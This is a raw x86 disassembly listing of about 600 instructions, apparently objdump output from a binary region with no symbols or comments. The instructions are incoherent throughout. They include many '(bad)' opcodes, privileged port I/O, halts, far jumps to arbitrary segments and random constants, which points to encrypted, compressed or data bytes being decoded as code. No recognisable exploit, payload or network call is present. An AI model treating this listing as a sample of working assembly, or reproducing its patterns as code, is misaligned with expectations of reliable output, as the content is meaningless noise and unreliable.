  426ae2:	push   eax
  426ae3:	adc    ebp,DWORD PTR [eax+eax*2-0x677e790e]
  426aea:	xor    DWORD PTR [ebp+0x65],edx
  426aed:	jmp    0x4acd2437
  426af2:	sub    DWORD PTR [ebx-0x67],0xffffff97
  426af6:	into   
  426af7:	stos   BYTE PTR es:[edi],al
  426af8:	dec    eax
  426af9:	int3   
  426afa:	test   eax,0x7c157f58
  426aff:	xor    eax,0x7b3b8493
  426b04:	mov    ebx,0xce064624
  426b09:	push   0x51
  426b0b:	aas    
  426b0c:	mov    bl,0xea
  426b0e:	mov    eax,0xb5ec7928
  426b13:	pusha  
  426b14:	pushf  
  426b15:	add    BYTE PTR [edi+0x13],0x4e
  426b19:	add    ebx,DWORD PTR [esi+0x28480b9f]
  426b1f:	cmp    ch,ch
  426b21:	test   BYTE PTR [esi],ch
  426b23:	adc    DWORD PTR [ecx-0x5929dba],0xffffffd7
  426b2a:	ja     0x426b9f
  426b2c:	inc    eax
  426b2d:	xchg   esi,eax
  426b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b2f:	test   ecx,esp
  426b31:	hlt    
  426b32:	push   es
  426b33:	lahf   
  426b34:	xchg   esi,eax
  426b35:	push   es
  426b36:	sar    BYTE PTR [eax-0x2b],1
  426b39:	iret   
  426b3a:	(bad)  
  426b3b:	mov    cl,0x23
  426b3d:	or     eax,0xe5b4f25f
  426b42:	pop    ecx
  426b43:	test   eax,0x4a570726
  426b48:	mov    bh,0xde
  426b4a:	dec    edi
  426b4b:	int3   
  426b4c:	inc    ebp
  426b4d:	retf   
  426b4e:	pushf  
  426b4f:	and    DWORD PTR [ecx+0x6199f112],0x9f83bb5f
  426b59:	xchg   edi,eax
  426b5a:	and    eax,0x12a00014
  426b5f:	call   0x824b:0xe179eeab
  426b66:	jg     0x426b3e
  426b68:	push   esi
  426b69:	sub    eax,0x95e3607f
  426b6e:	leave  
  426b6f:	adc    DWORD PTR [ebx+0x49],0xc6ecde05
  426b76:	rcr    dl,1
  426b78:	mov    edi,0x38aea947
  426b7d:	(bad)  
  426b7f:	(bad)  
  426b80:	ds je  0x426b43
  426b83:	add    DWORD PTR [edx],ecx
  426b85:	in     al,0xba
  426b87:	jle    0x426b6b
  426b89:	or     al,0xa6
  426b8b:	xchg   DWORD PTR [ecx+0x54],esi
  426b8e:	hlt    
  426b8f:	out    0xb9,al
  426b91:	enter  0x3a7e,0x8a
  426b95:	rcr    BYTE PTR [edx],0x2f
  426b98:	call   DWORD PTR cs:[ebx+0x70d86db3]
  426b9f:	cmp    DWORD PTR [ebx+0x57ec13b7],0x2f1f2f
  426ba9:	or     DWORD PTR [esi],ebx
  426bab:	pop    edi
  426bac:	retf   0x64db
  426baf:	or     eax,0x2d07a935
  426bb4:	test   al,0x14
  426bb6:	sbb    BYTE PTR [edi+edx*1-0x4a],ch
  426bba:	pop    edx
  426bbb:	cwde   
  426bbc:	mov    cl,0x69
  426bbe:	retf   0x10e8
  426bc1:	test   eax,0x5896f711
  426bc6:	fs mov bh,0x85
  426bc9:	test   al,0x35
  426bcb:	retf   0xd01f
  426bce:	jnp    0x426b90
  426bd0:	inc    ebx
  426bd1:	cmp    ecx,ebp
  426bd3:	pusha  
  426bd4:	inc    esi
  426bd5:	push   0xc9f826e5
  426bda:	and    dl,al
  426bdc:	pop    es
  426bdd:	adc    al,0x53
  426bdf:	cmp    DWORD PTR [ebx-0x1a95eae8],esi
  426be5:	push   esp
  426be6:	mov    al,BYTE PTR [edx+0xda26eb8]
  426bec:	jecxz  0x426b74
  426bee:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bf0:	scas   eax,DWORD PTR es:[edi]
  426bf1:	adc    esp,DWORD PTR [edx-0x32]
  426bf4:	adc    BYTE PTR [ecx-0x1e],cl
  426bf7:	push   cs
  426bf8:	cmp    DWORD PTR ds:0x356ead8a,edx
  426bfe:	push   0x13d8909f
  426c03:	(bad)  
  426c04:	das    
  426c05:	imul   edi,DWORD PTR [esi],0x16fd7210
  426c0b:	xlat   BYTE PTR ds:[ebx]
  426c0c:	xchg   DWORD PTR [eax],edi
  426c0e:	dec    ebp
  426c0f:	cmovo  edx,DWORD PTR [edx-0x697a7031]
  426c16:	mov    al,0xaa
  426c18:	inc    ebp
  426c19:	jo     0x426c69
  426c1b:	mov    bh,0xda
  426c1d:	mov    ch,0x4e
  426c1f:	xchg   ebx,eax
  426c20:	mov    ebx,0x8244cf83
  426c25:	jmp    0x426c67
  426c27:	retf   0xc287
  426c2a:	mov    dh,0xe6
  426c2c:	xchg   ecx,eax
  426c2d:	mov    eax,0x5310f07e
  426c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c33:	dec    edi
  426c34:	das    
  426c35:	xchg   edi,eax
  426c36:	xor    al,0x78
  426c38:	xor    al,0x5e
  426c3b:	xlat   BYTE PTR ds:[ebx]
  426c3c:	std    
  426c3d:	add    eax,0xca5daafc
  426c42:	ds jnp 0x426c1a
  426c45:	fstp   QWORD PTR [edx]
  426c47:	pop    edx
  426c48:	jns    0x426c2b
  426c4a:	(bad)  
  426c4b:	ret    
  426c4c:	or     esp,DWORD PTR [esi+0x32]
  426c4f:	test   eax,0x518a01fe
  426c54:	addr16 ret 0x8746
  426c58:	or     al,0xd5
  426c5a:	scas   al,BYTE PTR es:[edi]
  426c5b:	scas   al,BYTE PTR es:[edi]
  426c5c:	jnp    0x426c0a
  426c5e:	mov    WORD PTR [ebx+0x2149c84],gs
  426c64:	mov    dl,0x18
  426c66:	mov    ebp,0x61cd525b
  426c6b:	sar    cl,0x45
  426c6e:	sub    DWORD PTR [esi-0x1d],esp
  426c71:	(bad)  
  426c73:	xor    BYTE PTR [edi-0x9],dh
  426c76:	popa   
  426c77:	hlt    
  426c78:	sbb    BYTE PTR [ebp+0x760674bf],0xc2
  426c7f:	sbb    DWORD PTR [edx],esi
  426c81:	push   esp
  426c82:	and    BYTE PTR ds:0xfa389b6f,0x2
  426c89:	xor    edx,DWORD PTR [ebx]
  426c8b:	sti    
  426c8c:	push   0x56b08264
  426c91:	mov    ds:0x5820361e,al
  426c96:	(bad)  
  426c98:	ret    0xca75
  426c9b:	frndint 
  426c9d:	cmc    
  426c9e:	xchg   ebp,eax
  426c9f:	push   ecx
  426ca0:	sar    DWORD PTR [edx],0xab
  426ca3:	mov    ecx,0x4f078e1d
  426ca8:	mov    cl,0xfc
  426caa:	push   eax
  426cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cac:	inc    ebx
  426cad:	(bad)  
  426cae:	clc    
  426caf:	lea    esp,[edx+0x16c8c95a]
  426cb5:	jge    0x426c9d
  426cb7:	mov    ebx,0xf0b49a46
  426cbc:	pop    edx
  426cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cbe:	cmp    cl,dh
  426cc0:	adc    edi,edx
  426cc2:	fst    DWORD PTR [ebp+eax*4-0x77]
  426cc6:	fstp   TBYTE PTR [esi]
  426cc8:	sbb    eax,0xe59e2852
  426ccd:	das    
  426cce:	push   es
  426ccf:	cld    
  426cd0:	retf   
  426cd1:	lds    edi,FWORD PTR [ebp-0x7d8e6230]
  426cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cd8:	inc    ebx
  426cd9:	pop    ss
  426cda:	push   eax
  426cdb:	sbb    BYTE PTR es:0xdd9d4e9,ah
  426ce2:	in     al,0xb3
  426ce4:	xor    dh,dl
  426ce6:	xor    DWORD PTR [ebx+0x3d],ecx
  426ce9:	mov    al,0x14
  426ceb:	jne    0x426cd0
  426ced:	es mov bh,0x67
  426cf0:	jg     0x426d6a
  426cf2:	and    DWORD PTR [ecx+esi*8-0x64],0xfb47bd80
  426cfa:	add    BYTE PTR [eax],al
  426cfc:	push   0x6f1e2d23
  426d01:	push   ds
  426d02:	jnp    0x426d7b
  426d04:	fisub  WORD PTR [ebp-0x6a7d4fca]
  426d0a:	or     esi,DWORD PTR [edx+0x30]
  426d0d:	in     eax,0x1
  426d0f:	add    BYTE PTR [esi+0x58000002],al
  426d15:	and    al,0x4c
  426d17:	dec    ebx
  426d18:	or     ebp,DWORD PTR [ecx+ebx*4-0x6f41f62d]
  426d1f:	add    BYTE PTR [edx-0x14],al
  426d22:	pop    ds
  426d23:	adc    DWORD PTR [ebp+0x5720637],edx
  426d29:	fldenv [edi+edx*8-0xf]
  426d2d:	sub    esp,DWORD PTR [ebx-0x43a60729]
  426d33:	rcr    DWORD PTR [ebx-0x73ced6fe],cl
  426d39:	pop    ecx
  426d3a:	dec    ebx
  426d3b:	je     0x426da2
  426d3d:	ja     0x426cff
  426d3f:	jg     0x426da4
  426d41:	and    ecx,ebp
  426d43:	dec    edi
  426d44:	or     al,0x6f
  426d46:	rcr    DWORD PTR [eax],1
  426d48:	dec    esp
  426d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d4a:	fmulp  st(1),st
  426d4c:	mov    ss,WORD PTR [eax+0x1c459b34]
  426d52:	jp     0x426cff
  426d54:	gs adc eax,0x677ee7a8
  426d5a:	or     al,0x92
  426d5c:	push   ebp
  426d5d:	add    eax,DWORD PTR [ecx]
  426d5f:	add    DWORD PTR [esp+ebx*2],esi
  426d62:	lock jbe 0x426d5b
  426d65:	xchg   edx,eax
  426d66:	test   al,0xd5
  426d68:	jo     0x426d29
  426d6a:	and    eax,0xfac01ae2
  426d6f:	mov    eax,ds:0xa94b247e
  426d74:	out    0xff,al
  426d76:	mov    bh,0xdd
  426d78:	pop    ds
  426d79:	data16 repz ja 0x426d02
  426d7d:	not    edi
  426d7f:	pushf  
  426d80:	push   0xf
  426d82:	xchg   DWORD PTR [ecx+edx*4+0x64195edb],ebp
  426d89:	int3   
  426d8a:	cmp    BYTE PTR [edi],dh
  426d8c:	int3   
  426d8d:	push   esp
  426d8e:	jmp    0x6bcf:0x5ff00af1
  426d95:	push   eax
  426d96:	xchg   ecx,eax
  426d97:	inc    ecx
  426d98:	aaa    
  426d99:	ds inc ch
  426d9c:	mov    al,0xde
  426d9e:	xchg   esp,eax
  426d9f:	add    eax,0xcb997f64
  426da4:	repnz repz (bad) 
  426da7:	cli    
  426da8:	ja     0x426d3f
  426daa:	in     al,0x11
  426dac:	ins    DWORD PTR es:[edi],dx
  426dad:	jne    0x426df5
  426daf:	imul   ebx,DWORD PTR [edx+0x3c],0x34699595
  426db6:	push   esp
  426db7:	jmp    0x3df233fb
  426dbc:	and    BYTE PTR [edi-0x7de94ab2],0xbd
  426dc3:	sub    cl,BYTE PTR [ebp-0x7c]
  426dc6:	jp     0x426d55
  426dc8:	fisubr WORD PTR [ecx-0x5b7b46be]
  426dce:	and    esi,DWORD PTR [eax+0x4c32bb8a]
  426dd4:	inc    esi
  426dd5:	xchg   edx,eax
  426dd6:	and    BYTE PTR [edx+0x4d19c5c8],ch
  426ddc:	daa    
  426ddd:	rcr    DWORD PTR [ebx+0x28],cl
  426de0:	or     al,0x44
  426de2:	jp     0x426d6c
  426de4:	add    DWORD PTR ss:[ecx-0x41],ebx
  426de8:	xchg   ebp,eax
  426de9:	in     al,dx
  426dea:	mov    ebp,0x2f023d69
  426def:	inc    ebx
  426df0:	test   al,0xdf
  426df2:	mov    gs,ebx
  426df4:	iret   
  426df5:	jo     0x426d8b
  426df7:	data16 jnp 0x426e23
  426dfa:	adc    al,0x6e
  426dfc:	repnz mov ebx,0x92c5ba7a
  426e02:	mov    al,0x54
  426e04:	push   esi
  426e05:	push   ecx
  426e06:	shl    BYTE PTR [ecx+0x9fb22cf],1
  426e0c:	push   0xa
  426e0e:	mov    esi,0x6e3f11d4
  426e13:	xchg   DWORD PTR [ebp-0x2e],eax
  426e16:	fild   WORD PTR [eax+ecx*8+0x30]
  426e1a:	cwde   
  426e1b:	fs ja  0x426e91
  426e1e:	cmp    al,0xbd
  426e20:	inc    ecx
  426e21:	pop    esp
  426e22:	bound  ebx,QWORD PTR [eax+ebp*8-0x63a8e170]
  426e29:	(bad)  
  426e2a:	xor    al,0xa3
  426e2c:	pushf  
  426e2d:	jecxz  0x426e8c
  426e2f:	add    al,0xb1
  426e31:	add    esi,esp
  426e33:	xor    DWORD PTR [edi],edi
  426e35:	into   
  426e36:	imul   DWORD PTR [esi-0x55596c0e]
  426e3c:	ficom  DWORD PTR es:[ecx-0x16e98d9c]
  426e43:	dec    eax
  426e44:	cmp    bh,bh
  426e46:	sub    dh,bh
  426e48:	push   ebx
  426e49:	rol    DWORD PTR [ebp-0x5c0892c],0x86
  426e50:	push   edx
  426e51:	leave  
  426e52:	mov    al,ds:0x8a4e5524
  426e57:	loopne 0x426ec3
  426e59:	test   DWORD PTR [edx+0x72],edi
  426e5c:	add    dl,al
  426e5e:	push   0xffffffc1
  426e60:	push   0xffffffdc
  426e62:	jns    0x426ed7
  426e64:	gs mov cl,0x15
  426e67:	test   DWORD PTR [edx+0x7a],ebx
  426e6a:	call   0x16f0c34a
  426e6f:	aam    0x41
  426e71:	xor    eax,DWORD PTR [ecx+0xa]
  426e74:	jmp    0x6d6db1d5
  426e79:	inc    ebx
  426e7a:	xchg   ecx,eax
  426e7b:	aas    
  426e7c:	repnz clc 
  426e7e:	and    DWORD PTR [ecx],ecx
  426e80:	(bad)  
  426e81:	mov    dh,0x29
  426e83:	(bad)  
  426e85:	pop    esp
  426e86:	push   cs
  426e87:	sbb    bh,BYTE PTR [edx+0x7eb4c132]
  426e8d:	inc    edx
  426e8e:	adc    eax,0x20a0465a
  426e93:	out    dx,al
  426e94:	or     dl,BYTE PTR [edi-0x7e6c5f13]
  426e9a:	dec    esi
  426e9b:	pop    es
  426e9c:	daa    
  426e9d:	pop    ebp
  426e9e:	pop    edx
  426e9f:	fwait
  426ea0:	mov    al,0x61
  426ea2:	mov    ch,BYTE PTR [ebx-0x1]
  426ea5:	aaa    
  426ea6:	fisttp WORD PTR ss:[ecx+0x5a]
  426eaa:	lock mov ebx,0xbb409086
  426eb0:	xchg   BYTE PTR [ebp+0x11e2057],bl
  426eb6:	dec    edx
  426eb7:	(bad)  
  426eb8:	xchg   esi,eax
  426eb9:	test   DWORD PTR [eax-0x2d],edi
  426ebc:	cli    
  426ebd:	mov    BYTE PTR [eax],dl
  426ebf:	daa    
  426ec0:	jl     0x426ee8
  426ec2:	sub    al,0x47
  426ec4:	sub    edi,DWORD PTR [ebx-0x60655969]
  426eca:	mov    BYTE PTR [esi+0x14414aa],al
  426ed0:	xor    DWORD PTR [edi-0x7f4943b6],edi
  426ed6:	fucom  st(7)
  426ed8:	mov    eax,ds:0xcd25739a
  426edd:	jns    0x426ed9
  426edf:	cs push ss
  426ee1:	sub    DWORD PTR [ecx-0x44501ecf],0xe610b190
  426eeb:	sub    ch,cl
  426eed:	push   ebp
  426eee:	and    edi,DWORD PTR [eax+0x51dd5717]
  426ef4:	test   ah,al
  426ef6:	xchg   ebx,eax
  426ef7:	mov    ah,0x76
  426ef9:	out    0xb8,eax
  426efb:	sbb    al,0xb
  426efd:	neg    BYTE PTR [edi+ecx*4]
  426f00:	scas   eax,DWORD PTR es:[edi]
  426f01:	pop    ebp
  426f02:	dec    ecx
  426f03:	push   ebx
  426f04:	les    eax,FWORD PTR gs:[eax+0x19]
  426f08:	push   es
  426f09:	xor    DWORD PTR [eax+ecx*8+0x35],ebp
  426f0d:	push   ds
  426f0e:	dec    ebp
  426f0f:	(bad)  
  426f11:	lea    edi,[ebx]
  426f13:	loop   0x426eb2
  426f15:	test   BYTE PTR [eax+0x234a9962],ah
  426f1b:	cmc    
  426f1c:	cld    
  426f1d:	scas   eax,DWORD PTR es:[edi]
  426f1e:	fistp  WORD PTR [edx+0x66]
  426f21:	push   eax
  426f22:	jmp    0xdc6ee8bc
  426f27:	fcmove st,st(3)
  426f29:	pushf  
  426f2a:	jl     0x426f8b
  426f2c:	fs adc al,dl
  426f2f:	push   0xfffffffb
  426f31:	mov    esi,0x576bba7a
  426f36:	int3   
  426f37:	test   eax,0xc5675614
  426f3c:	mov    dl,0x79
  426f3e:	jae    0x426fbc
  426f40:	arpl   WORD PTR [ebp-0xd89ff1f],bp
  426f46:	xchg   edx,eax
  426f47:	and    ah,BYTE PTR [edi-0x7d]
  426f4a:	lods   eax,DWORD PTR ds:[esi]
  426f4b:	mov    WORD PTR [edx],fs
  426f4d:	addr16 aad 0xad
  426f50:	ds jge 0x426fc9
  426f53:	cmc    
  426f54:	repnz add BYTE PTR [eax-0x3cae542d],0xf9
  426f5c:	rcl    ah,0xb0
  426f5f:	sbb    al,0xaa
  426f61:	inc    ecx
  426f62:	mov    es,eax
  426f64:	lds    ebp,FWORD PTR [ebx+ecx*4-0x80]
  426f68:	es jl  0x426f7e
  426f6b:	jne    0x426f25
  426f6d:	shl    BYTE PTR [ebx],1
  426f6f:	xor    ecx,ebp
  426f71:	dec    ebx
  426f72:	iret   
  426f73:	cmp    DWORD PTR [ebp+0x7c198cbc],esi
  426f79:	jno    0x426f18
  426f7b:	xchg   edx,eax
  426f7c:	popf   
  426f7d:	(bad)  
  426f7f:	cmc    
  426f80:	xchg   edi,eax
  426f81:	sub    al,0xda
  426f83:	or     al,0x87
  426f85:	push   ds
  426f86:	(bad)  
  426f87:	mov    cl,0xf2
  426f89:	cmc    
  426f8a:	fistp  WORD PTR [ebp-0x60]
  426f8d:	mov    al,ds:0xda11c71e
  426f92:	jmp    0x427012
  426f94:	cmp    eax,0x9668062c
  426f99:	sbb    eax,0xc8990000
  426f9e:	clc    
  426f9f:	lahf   
  426fa0:	stc    
  426fa1:	mov    edi,0xdf92ceff
  426fa6:	push   ds
  426fa7:	outs   dx,BYTE PTR ds:[esi]
  426fa8:	pop    edi
  426fa9:	in     eax,0x1
  426fab:	icebp  
  426fac:	mov    dh,0xe7
  426fae:	add    DWORD PTR [eax],eax
  426fb0:	xchg   BYTE PTR [edx],al
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    eax,0x6ac094dd
  426fb9:	es xor eax,0x4c285ae2
  426fbf:	es push ebp
  426fc1:	push   es
  426fc2:	sbb    bh,BYTE PTR [ebp-0x623964d2]
  426fc8:	fnstcw WORD PTR [edi+ebp*1+0x6a447db1]
  426fcf:	dec    ecx
  426fd0:	ins    BYTE PTR es:[edi],dx
  426fd1:	mov    edx,0xcaaee672
  426fd6:	aad    0xe8
  426fd8:	add    cl,0x6b
  426fdb:	add    bl,BYTE PTR [ebx+0x4d]
  426fde:	and    al,ah
  426fe0:	in     al,dx
  426fe1:	(bad)  
  426fe3:	scas   al,BYTE PTR es:[edi]
  426fe4:	and    esi,DWORD PTR [edi-0x2091ddb6]
  426fea:	lock inc ebp
  426fec:	pop    ebp
  426fed:	pop    edi
  426fee:	push   0x603e6812
  426ff3:	js     0x42704b
  426ff5:	inc    edx
  426ff6:	mov    ebp,0xd2d0082b
  426ffb:	dec    edx
  426ffc:	sub    eax,0x53da5639
  427001:	pop    ebx
  427002:	(bad)  
  427003:	xlat   BYTE PTR ds:[ebx]
  427004:	mov    cl,0xf5
  427006:	lahf   
  427007:	std    
  427008:	adc    ch,BYTE PTR [ecx-0x24]
  42700b:	jge    0x42702b
  42700d:	xor    BYTE PTR [eax+ebp*1+0x2b],0x16
  427012:	mov    al,0xbe
  427014:	add    DWORD PTR [eax-0x63450cbf],0xffffffd8
  42701b:	dec    esp
  42701c:	mov    ebp,ds
  42701e:	retf   0xbc25
  427021:	xchg   ecx,eax
  427022:	sub    ebp,DWORD PTR cs:[ebx]
  427025:	jbe    0x426fd2
  427027:	sbb    BYTE PTR [edi+0x3154ece2],bh
  42702d:	aaa    
  42702e:	shr    esi,0x55
  427031:	shl    DWORD PTR [esi+0x504fa5d3],cl
  427037:	addr16 push ecx
  427039:	ins    BYTE PTR es:[edi],dx
  42703a:	pop    esp
  42703b:	pop    edi
  42703c:	out    dx,al
  42703d:	xlat   BYTE PTR ds:[ebx]
  42703e:	push   ebp
  42703f:	repz inc esp
  427041:	test   eax,0x343a9ce4
  427046:	push   ebp
  427047:	call   0x7d160bc1
  42704c:	fs fs pop edi
  42704f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427050:	out    dx,eax
  427051:	add    ah,BYTE PTR [edi-0x28b194d0]
  427057:	out    dx,al
  427058:	or     eax,0xa2d25696
  42705d:	bound  esp,QWORD PTR [eax+0x40]
  427060:	in     al,dx
  427061:	je     0x42705e
  427063:	push   0x25e6335d
  427068:	enter  0xe699,0xbf
  42706c:	stos   BYTE PTR es:[edi],al
  42706d:	mov    ds:0x5b5cfc18,al
  427072:	mov    al,0xd5
  427074:	scas   eax,DWORD PTR es:[edi]
  427075:	push   edi
  427076:	loopne 0x427008
  427078:	and    eax,DWORD PTR [edi-0x6365ee50]
  42707e:	mov    ebp,0xaa0ccc11
  427083:	(bad)  
  427084:	push   ebx
  427085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427086:	inc    esp
  427087:	iret   
  427088:	scas   eax,DWORD PTR es:[edi]
  427089:	mov    ch,0x18
  42708b:	or     DWORD PTR [esp+esi*8+0x352dac7f],esi
  427092:	jnp    0x427087
  427094:	(bad)  
  427095:	jns    0x42710b
  427097:	das    
  427098:	adc    cl,BYTE PTR [ebx]
  42709a:	nop
  42709b:	and    eax,0x82a430a5
  4270a0:	or     DWORD PTR [eax],eax
  4270a2:	(bad)  
  4270a3:	imul   ecx,DWORD PTR [edi],0xd389a0ae
  4270a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270aa:	mov    ds:0xcbf04e70,al
  4270af:	iret   
  4270b0:	aad    0x6c
  4270b2:	mov    ch,0xa4
  4270b4:	adc    bl,dl
  4270b6:	scas   eax,DWORD PTR es:[edi]
  4270b7:	push   ebx
  4270b8:	inc    ebx
  4270b9:	sti    
  4270ba:	xchg   edi,eax
  4270bb:	add    esp,DWORD PTR [edx]
  4270bd:	in     al,dx
  4270be:	(bad)  
  4270bf:	test   al,0x46
  4270c1:	ds inc ebx
  4270c3:	inc    edi
  4270c4:	dec    ecx
  4270c5:	xor    DWORD PTR [edi+0x2c],ebp
  4270c8:	pushf  
  4270c9:	sti    
  4270ca:	inc    esi
  4270cb:	loope  0x427104
  4270cd:	test   DWORD PTR [ecx],0xefb72983
  4270d3:	sbb    BYTE PTR [edi-0x26],dl
  4270d6:	mov    al,0x29
  4270d8:	adc    ecx,esi
  4270da:	(bad)  [ebx+0x6c3c1c8a]
  4270e0:	pop    edi
  4270e1:	jmp    0xc815:0x8e38e105
  4270e8:	adc    DWORD PTR [esi+eiz*2-0x6e887bef],0x5f100886
  4270f3:	repnz sahf 
  4270f5:	add    ah,al
  4270f7:	and    eax,0xfc66cc06
  4270fc:	loope  0x4270b7
  4270fe:	sbb    cl,0xf7
  427101:	xchg   DWORD PTR [edi-0x85861b],ebp
  427107:	retf   0xb65d
  42710a:	and    al,0xa
  42710c:	ins    BYTE PTR es:[edi],dx
  42710d:	xchg   esi,eax
  42710e:	out    0xa8,eax
  427110:	push   esp
  427111:	je     0x427136
  427113:	fadd   DWORD PTR [ebx+edi*8-0x6]
  427117:	loop   0x4270ea
  427119:	ret    
  42711a:	pop    ss
  42711b:	push   eax
  42711c:	loopne 0x4270bf
  42711e:	scas   al,BYTE PTR es:[edi]
  42711f:	mov    ebx,0xa2689894
  427124:	arpl   WORD PTR [eax+edi*8],ax
  427127:	test   DWORD PTR [edx+0x131abefb],esp
  42712d:	rcl    BYTE PTR [ebx],1
  42712f:	push   esi
  427130:	mov    ebx,0xcbb18156
  427135:	sub    edi,DWORD PTR [ecx]
  427137:	ror    DWORD PTR [eax+eiz*8-0x10dbbcf1],0xd0
  42713f:	mov    ds:0xf8f0d944,eax
  427144:	scas   eax,DWORD PTR es:[edi]
  427145:	or     al,0xe1
  427147:	xlat   BYTE PTR ds:[ebx]
  427148:	(bad)  
  427149:	iret   
  42714a:	or     esi,ebp
  42714c:	pcmpeqd mm6,QWORD PTR [edx-0x2cb37224]
  427153:	push   0x1fae1535
  427158:	js     0x427107
  42715a:	int3   
  42715b:	cmp    al,0x72
  42715d:	outs   dx,BYTE PTR ds:[esi]
  42715e:	int    0xd5
  427160:	rol    BYTE PTR [eax+0x5],cl
  427163:	pushf  
  427164:	push   es
  427165:	mov    edx,0xd3aaaf60
  42716a:	or     eax,0xfcfadbca
  42716f:	movd   ebx,mm5
  427172:	sub    eax,0xcd505efa
  427177:	dec    esp
  427178:	lods   eax,DWORD PTR ds:[esi]
  427179:	xor    BYTE PTR [eax+0x7f],cl
  42717c:	imul   ebx,DWORD PTR [esi],0x664f4988
  427182:	cmp    eax,DWORD PTR [ecx]
  427184:	jmp    0x1f32:0xbe9aade9
  42718b:	pop    ss
  42718c:	and    ah,BYTE PTR [ebp+ecx*2-0x3b]
  427190:	ins    DWORD PTR es:[edi],dx
  427191:	int3   
  427192:	out    dx,al
  427193:	jbe    0x42720a
  427195:	and    esi,DWORD PTR [ebx]
  427197:	cmp    eax,0x5ab6e578
  42719c:	dec    esi
  42719d:	stc    
  42719e:	pop    ebx
  42719f:	lods   eax,DWORD PTR ds:[esi]
  4271a0:	jp     0x4271d4
  4271a2:	mov    edx,0x25fcf501
  4271a7:	push   cs
  4271a8:	es data16 jo 0x427143
  4271ac:	test   eax,0x6b43cd0e
  4271b1:	cmp    al,0x18
  4271b3:	mov    dl,0xf7
  4271b5:	inc    eax
  4271b6:	loopne 0x4271b5
  4271b8:	lea    edx,[esi-0x1b464033]
  4271be:	stos   BYTE PTR es:[edi],al
  4271bf:	xchg   edx,eax
  4271c0:	div    BYTE PTR [eax+ecx*1]
  4271c3:	mov    bl,0x13
  4271c5:	(bad)  
  4271c7:	je     0x4271da
  4271c9:	retf   0x9cf3
  4271cc:	jns    0x4271e4
  4271ce:	xchg   esp,esi
  4271d0:	aam    0xe4
  4271d2:	mov    eax,ds:0x6420339
  4271d7:	jl     0x4271ec
  4271d9:	imul   eax,DWORD PTR [esi],0x1cf31865
  4271df:	mov    eax,ds:0x9a5f5a30
  4271e4:	sar    DWORD PTR fs:[edi-0x4ca3ab9],cl
  4271eb:	repnz out dx,al
  4271ed:	nop
  4271ee:	push   ecx
  4271ef:	pop    ds
  4271f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271f1:	sbb    dl,BYTE PTR [edi+0x28]
  4271f4:	fscale 
  4271f6:	jno    0x427192
  4271f8:	jmp    0xf95c:0x40fc2427
  4271ff:	and    al,0xde
  427201:	jns    0x4271d2
  427203:	xchg   ebp,eax
  427204:	jl     0x42727b
  427206:	cmp    BYTE PTR [edx],cl
  427208:	xchg   esp,eax
  427209:	or     al,0x1f
  42720b:	mov    ebx,edi
  42720d:	iret   
  42720e:	ins    BYTE PTR es:[edi],dx
  42720f:	jno    0x4271ea
  427211:	mov    dh,cl
  427213:	cmp    BYTE PTR [edi-0x27],ah
  427216:	jno    0x427289
  427218:	jmp    0x39b2dc6c
  42721d:	sub    BYTE PTR [ebx],dh
  42721f:	pop    ebp
  427220:	test   eax,0x7616e092
  427225:	jecxz  0x427202
  427227:	or     ch,al
  427229:	inc    ebx
  42722a:	lods   eax,DWORD PTR ds:[esi]
  42722b:	pop    eax
  42722c:	pop    ebp
  42722d:	rcl    BYTE PTR [ebx],cl
  42722f:	mov    dh,0xb0
  427231:	pop    ss
  427232:	or     eax,0x998f7c8
  427237:	push   ebx
  427238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427239:	sub    BYTE PTR [eax],al
  42723b:	add    BYTE PTR [ecx+0xa],bh
  42723e:	sbb    BYTE PTR gs:[edi+0x7f],dh
  427242:	jge    0x4272af
  427244:	int3   
  427245:	outs   dx,BYTE PTR ds:[esi]
  427246:	xchg   esi,esi
  427248:	xchg   ebp,eax
  427249:	pop    edx
  42724a:	xor    ah,dh
  42724c:	cmp    al,0xea
  42724e:	add    DWORD PTR [eax],eax
  427250:	xchg   BYTE PTR [edx],al
  427252:	add    BYTE PTR [eax],al
  427254:	sbb    al,0x26
  427256:	push   ebp
  427257:	mov    ds:0x70a5ab26,eax
  42725c:	mov    si,0x50e5
  427260:	(bad)  
  427262:	cmp    DWORD PTR [ebp-0x289a1080],eax
  427268:	addr16 xchg ebp,eax
  42726a:	pop    ds
  42726b:	stc    
  42726c:	mov    ecx,0x5926e134
  427271:	cs clc 
  427273:	xchg   esi,eax
  427274:	arpl   WORD PTR [ecx-0x318b0092],sp
  42727a:	push   es
  42727b:	dec    ecx
  42727c:	and    eax,0x326042c7
  427281:	sub    BYTE PTR [ebx+0x22893fe3],0x96
  427288:	ss or  al,0x6a
  42728b:	inc    esp
  42728c:	sbb    bh,BYTE PTR [ebp+0x15]
  42728f:	ins    BYTE PTR es:[edi],dx
  427290:	add    cl,BYTE PTR [ebp+0x71ba1c34]
  427296:	lea    ebp,[ecx]
  427298:	mov    esi,0xe30cede7
  42729d:	addr16 jmp 0xff4b9788
  4272a3:	mov    ?,WORD PTR [ebp-0x48]
  4272a6:	adc    eax,0x8dfde601
  4272ab:	out    0x9,al
  4272ad:	in     eax,0x59
  4272af:	xor    dl,BYTE PTR [ebx]
  4272b1:	pop    ds
  4272b2:	or     esi,edi
  4272b4:	lahf   
  4272b5:	dec    esi
  4272b6:	jno    0x427266
  4272b8:	xchg   esp,eax
  4272b9:	into   
  4272ba:	loopne 0x4272ff
  4272bc:	sti    
  4272bd:	pop    ebp
  4272be:	(bad)  
  4272c0:	dec    esi
  4272c1:	jne    0x42724d
  4272c3:	fstp   QWORD PTR [ebx-0x30]
  4272c6:	pop    ebx
  4272c7:	jp     0x427320
  4272c9:	push   esi
  4272ca:	(bad)  
  4272cb:	aaa    
  4272cc:	sbb    BYTE PTR [ebx+0x18e912ce],0x32
